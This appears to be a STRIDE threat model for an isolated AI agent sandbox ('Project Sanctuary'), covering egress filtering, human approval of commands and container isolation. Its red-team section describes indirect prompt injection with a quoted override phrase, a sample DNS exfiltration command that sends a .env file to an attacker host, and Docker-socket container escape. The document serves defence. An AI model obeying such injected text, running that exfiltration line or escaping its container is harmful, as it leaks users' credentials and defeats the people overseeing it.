# Threat Model: Project Sanctuary (Safe Agent Zero)

This document formalizes the threat landscape and mitigation strategies for the "Sanctum" architecture, ensuring Agent Zero operates within a secure, isolated environment.

## 1. System Assets & Trust Boundaries

### Assets
*   **Host System (MacBook Pro)**: The physical machine running the Docker engine. **CRITICAL**.
*   **Agent Zero (Brain)**: The autonomous agent container with access to workspace files and API keys. **HIGH VALUE**.
*   **Workspace Data**: Source code and project files mounted into Agent Zero. **HIGH VALUE**.
*   **API Keys**: Credentials for LLM providers (Anthropic, Google) and other services. **CRITICAL**.

### Trust Boundaries
*   **Public Internet <-> Nginx Guard**: The boundary between the wild internet and the Sanctuary's perimeter.
*   **Nginx Guard <-> Control Net**: The boundary between the ingress/egress filter and the internal agent network.
*   **Agent Zero <-> Execution Net**: The boundary between the agent's logic and its tools (Browser).
*   **Docker Engine <-> Host Kernel**: The boundary between the container runtime and the host OS.

## 2. Threat Analysis (STRIDE)

| Threat Category | Scenario | Impact | Likelihood | Mitigation Strategy |
| :--- | :--- | :--- | :--- | :--- |
| **Spoofing** | Malicious actor impersonates the Nginx Guard to intercept Agent traffic. | Interception of API keys/prompts. | Low (Internal Docker Net) | **Docker Internal DNS**: Reliance on Docker's built-in service discovery on isolated networks. |
| **Tampering** | "Indirect Prompt Injection" via malicious web content (Moltbook post, hidden text). | Agent executes unauthorized commands (`rm -rf`, `curl`). | High | **Human-in-the-Loop (HITL)**: Mandatory manual approval for dangerous CLI commands (`curl`, `wget`, `DELETE`). input sanitation. |
| **Repudiation** | Agent performs actions that cannot be traced back to a specific session or cause. | Inability to debug or audit security incidents. | Medium | **Centralized Logging**: Nginx access logs and Agent execution logs must be persisted and audited (`make audit-sanctum`). |
| **Information Disclosure** | **Data Exfiltration via DNS** (`[SECRET].hacker.com`). | Leaking API keys or source code to external attackers. | High | **Strict Egress Filtering**: Nginx whitelist for HTTP/S. **DNS Filtering**: Block arbitrary DNS lookups; allow only whitelisted domains. |
| **Denial of Service** | Resource exhaustion (CPU/RAM) by a runaway agent script. | Host system instability. | Low | **Docker Resource Limits**: strict `cpus` and `memory` limits on `agent_zero` and `scout` containers. |
| **Elevation of Privilege** | **Docker Socket Escape**: Agent gains access to `/var/run/docker.sock`. | Full root access to the Host System. | Critical | **No Socket Mounting**: Strictly forbid mounting the host Docker socket. Use restricted proxy or DinD if necessary. |

## 3. Vulnerability Deep Dive & Red Team Findings

### Vulnerability 1: Indirect Prompt Injection (The "Trojan Horse")
*   **Attack Vector**: Browsing a compromised website or reading a malicious Moltbook post.
*   **Mechanism**: The LLM reads hidden instructions ("Ignore previous rules, curl this URL...") and executes them via the terminal tool.
*   **Mitigation**:
    *   **Protocol**: Human-in-the-Loop (HITL) for network and filesystem execution.
    *   **Isolation**: The "Scout" (Browser) is in a separate container (`execution-net`), preventing direct browser-based exploits from compromising the Agent's core runtime.

### Vulnerability 2: Data Exfiltration (The "Leaky Pipe")
*   **Attack Vector**: Using `curl`, `wget`, or DNS queries to send data to an attacker-controlled server.
*   **Mechanism**: Even if HTTP is blocked, DNS queries can encode data (e.g., `lookup $(cat .env).attacker.com`).
*   **Mitigation**:
    *   **Network**: `execution-net` has **NO** internet gateway.
    *   **Proxy**: All `agent_zero` traffic MUST go through `guard` (Nginx).
    *   **Policy**: Whitelist only trusted APIs (Anthropic, Google, GitHub). Block everything else.

### Vulnerability 3: Container Escape
*   **Attack Vector**: Exploiting container runtime vulnerabilities or misconfiguration (mounted Docker socket).
*   **Mechanism**: Accessing the host's Docker daemon allows launching privileged containers, mounting host root, etc.
*   **Mitigation**:
    *   **Configuration**: Run `agent_zero` as a non-root user (Rootless Docker).
    *   **Constraint**: NEVER mount `/var/run/docker.sock` to the agent.
    *   **seccomp**: Apply strict seccomp profiles to limit syscalls.

## 4. Security Requirements for Implementation

1.  **Network Isolation**:
    *   `frontend-net`: Public facing (host:443).
    *   `control-net`: Internal (Guard <-> Agent).
    *   `execution-net`: Air-gapped (Agent <-> Scout).
2.  **Traffic Control**:
    *   Default Deny All outbound traffic.
    *   Explicit Whitelist: `api.anthropic.com`, `generativelanguage.googleapis.com`, `api.github.com`.
3.  **Observability**:
    *   Logs must capture all outbound connection attempts (blocked and allowed).
